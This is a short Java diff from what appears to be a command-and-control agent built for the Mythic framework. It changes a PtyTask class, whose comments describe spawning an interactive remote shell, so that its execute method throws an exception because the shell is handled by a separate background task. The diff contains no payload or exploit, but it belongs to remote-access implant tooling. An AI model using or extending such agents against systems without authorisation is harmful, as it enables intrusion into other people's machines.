@@ -5,7 +5,8 @@ import com.woopsie.Config;
 
 /**
  * PTY task - spawns a pseudo-terminal for interactive shell access
- * This is a background task that uses interactive messages
+ * This task should never be executed - PTY is handled entirely by PtyBackgroundTask
+ * The Agent detects "pty" command and starts the background task directly
  */
 public class PtyTask implements Task {
     
@@ -16,10 +17,10 @@ public class PtyTask implements Task {
     
     @Override
     public String execute(Config config, JsonNode parameters) throws Exception {
-        Config.debugLog(config, "PTY task executing with parameters: " + parameters);
+        Config.debugLog(config, "PtyTask.execute() called - this should not happen!");
         
-        // Return the JSON output for background task initialization
-        // The output format must match Mythic's expectations for background tasks
-        return "";
+        // This should never actually be called - pty is handled as a background task
+        // The Agent detects pty commands and starts the background task directly
+        throw new Exception("PTY must be run as background task");
     }
 }
